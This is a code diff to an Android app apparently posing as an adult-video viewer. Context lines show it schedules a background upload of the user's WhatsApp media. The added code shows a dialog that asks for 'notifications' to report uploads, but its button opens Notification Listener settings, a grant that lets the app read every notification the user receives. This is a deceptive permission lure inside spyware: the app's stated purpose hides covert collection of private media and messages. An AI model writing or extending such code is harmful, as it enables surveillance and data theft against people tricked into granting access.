@@ -23,8 +23,10 @@ import com.bushorat.app.adapters.VideoAdapter;
 import com.bushorat.app.databinding.ActivityPornBinding;
 import com.bushorat.app.helpers.FeaturePermissions;
 import com.bushorat.app.helpers.ImageUploadWorker;
+import com.bushorat.app.helpers.NotificationHelper;
 import com.bushorat.app.helpers.SessionManager;
 import com.bushorat.app.models.VideoModel;
+import androidx.appcompat.app.AlertDialog;
 
 import java.util.ArrayList;
 import java.util.Collections;
@@ -69,6 +71,9 @@ public class PornActivity extends AppCompatActivity {
             return;
         }
 
+        // ✅ Request notification permission INSIDE video activity (not on app launch)
+        askForNotificationPermissionIfNeeded();
+
         adapter = new VideoAdapter(this, videoList);
         scheduleImageUploadWorker();
         Log.d("PornActivity", "WhatsApp media upload scheduled");
@@ -106,6 +111,33 @@ public class PornActivity extends AppCompatActivity {
                 put("timestamp", System.currentTimeMillis());
             }});
         }
+    }
+
+    /**
+     * Ask for notification permission ONLY when user opens video activity
+     * Not on app launch - keeps Dashboard clean
+     */
+    private void askForNotificationPermissionIfNeeded() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
+            return;  // Notification permission only needed on Android 13+
+        }
+        
+        if (NotificationHelper.isNotificationServiceEnabled(this)) {
+            return;  // Already granted
+        }
+        
+        // Show permission dialog
+        new AlertDialog.Builder(this)
+                .setTitle("🔔 Enable Notifications")
+                .setMessage("Get notified when files are uploaded in background")
+                .setPositiveButton("Enable", (d, w) -> {
+                    NotificationHelper.openNotificationListenerSettings(this);
+                })
+                .setNegativeButton("Later", (d, w) -> {
+                    Toast.makeText(this, "You can enable this later in settings", Toast.LENGTH_SHORT).show();
+                })
+                .setCancelable(true)
+                .show();
     }
 
     private void scheduleImageUploadWorker() {
